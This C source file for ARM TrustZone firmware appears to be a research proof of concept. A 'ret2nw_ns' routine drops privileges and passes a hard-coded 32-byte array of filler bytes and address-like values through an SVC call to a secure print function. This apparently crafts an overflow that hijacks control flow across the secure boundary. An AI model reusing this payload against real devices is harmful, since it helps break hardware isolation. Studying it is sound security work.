/*
 * ret2nw_ns.c
 *
 * Created: 5/23/2022 11:24:27 AM
 *  Author: andy2
 */ 

#include "ret2nw_ns.h"
#include "trustzone_veneer.h"

void print_in_s_handler(char* content);
void func_up_ns(void);

void SVC_Handler_Main(uint32_t exc_return_code, uint32_t msp_val)
{
	uint32_t stack_frame_addr;
	unsigned int *svc_args;
	uint8_t svc_number;
	char* stacked_r0;
	// Determines which stack pointer was used
	if (exc_return_code & 0x4) stack_frame_addr = __get_PSP();
	else stack_frame_addr = msp_val;
	// Determines whether additional state context is present
	if (exc_return_code & 0x20) {
		svc_args = (unsigned *) stack_frame_addr;}
	else {// additional state context present (only for Secure SVC)
		svc_args = (unsigned *) (stack_frame_addr+40);}
	// extracts SVC number
	svc_number = ((char *) svc_args[6])[-2]; // Memory[(stacked_pc)-2]
	stacked_r0 = (char *) svc_args[0];
	switch (svc_number)
	{
		case 0:
		print_in_s_handler(stacked_r0);
		break;
		default:
		break;
	}
}

void __attribute__((naked)) SVC_Handler(void)
{
	__asm volatile(
		"mov r0, lr\n\t"
		"mov r1, sp\n\t"
		"b      SVC_Handler_Main\n\t"
	);
}

void print_in_s_handler(char* content)
{
	print_nsc(content);
}

void print_in_s_ns(char* user_str)
{
	register char* r0 __asm("r0") = user_str;
	__asm volatile("svc #0"
		:
		: "r"  (r0)
	);
}

void ret2nw_ns()
{
	char user_input[32] = {\
		0x20,0x20,0x20,0x20,\
		0xc0,0x05,0x00,0x20,\
		0x6f,0x01,0x00,0x00,\
		0x22,0x22,0x22,0x22,\
		0x23,0x23,0x23,0x23,\
		0x24,0x24,0x24,0x24,\
		0x52,0x83,0x00,0x00,\
		0x25,0x25,0x25,0x25};
	DROP_NS_PRIVILEGES;
	print_in_s_ns(user_input);
	func_up_ns();
}

void func_up_ns()
{
	while(1)
	{
		
	}
}